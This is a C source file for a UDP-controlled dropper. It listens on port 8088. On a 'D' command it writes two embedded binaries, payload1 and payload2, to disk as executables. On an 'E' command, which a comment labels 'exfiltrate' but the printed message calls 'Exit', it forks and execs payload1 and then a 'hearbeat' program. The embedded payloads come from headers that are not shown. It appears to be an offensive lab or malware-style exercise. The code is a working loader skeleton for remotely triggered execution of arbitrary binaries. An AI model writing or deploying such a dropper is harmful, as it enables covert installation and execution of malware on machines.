#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <signal.h>
#include <fcntl.h>

#include "payload1.h"
#include "payload2.h"

#define PORT 8088 

void  write_payload1_to_disk() {
    ssize_t payload_written;
    int fd = open("payload1", O_WRONLY | O_CREAT | O_TRUNC, 0755);
    payload_written = write(fd, payload1, payload1_len);
    close(fd);

}

void  write_payload2_to_disk() {
    ssize_t payload_written;
    int fd = open("payload2", O_WRONLY | O_CREAT | O_TRUNC, 0755);
    payload_written = write(fd, payload2, payload2_len);
    close(fd);

}


void spawn_payload() {

    pid_t parentID = getpid();

    // convert parent PID to string so payload knows who spawned it
    char pbuffer[16];
    sprintf(pbuffer, "%d", parentID);

    // exec arguments (argv)
    char *args[] = {"./payload1", pbuffer, NULL};

    pid_t pid = fork();

    if (pid < 0) {
        perror("fork");
        return;
    }

    if (pid == 0) {
        // this is CHILD
        // Replace this process with the payload program
        execv(args[0], args);

        // if execv returns, sth failed
        perror("execv");
        exit(1);
    }

    // Parent continues work
    printf("[server] Spawned payload with PID %d\n", pid);
    char *args1[] = {"./hearbeat",NULL};
    execv(args1[0], args1);
}

// ---------------------------------------------------------------
// UDP Command Listener: D = deploy, E = exfiltrate
// ---------------------------------------------------------------

void udp_listener() {
    int sockfd;
    struct sockaddr_in server_addr, client_addr;
    char buffer[32];

    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        perror("socket");
        exit(1);
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(8088);
    server_addr.sin_addr.s_addr = INADDR_ANY;

    if (bind(sockfd, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
        perror("bind");
        exit(1);
    }

    printf("[server] UDP listener running on port 8088...\n");

    while (1) {
        socklen_t len = sizeof(client_addr);
        int n = recvfrom(sockfd, buffer, sizeof(buffer)-1, 0,
        (struct sockaddr*)&client_addr, &len);

        if (n < 0) continue;
        buffer[n] = '\0';

        printf("[server] Received command: %s\n", buffer);

        if (buffer[0] == 'D') {
            printf("[server] Deploy command received.\n");
            write_payload1_to_disk();
            write_payload2_to_disk();
        }
        else if (buffer[0] == 'E') {
            printf("[server] Exit command received.\n");
            spawn_payload();
            break;
        }
    }

    close(sockfd);
}

// ---------------------------------------------------------------
// MAIN SERVER PROGRAM
// ---------------------------------------------------------------

int main() {
    printf("[server] Starting server (PID %d)\n", getpid());

    udp_listener();

    printf("[server] Shutting down...\n");
    return 0;
}
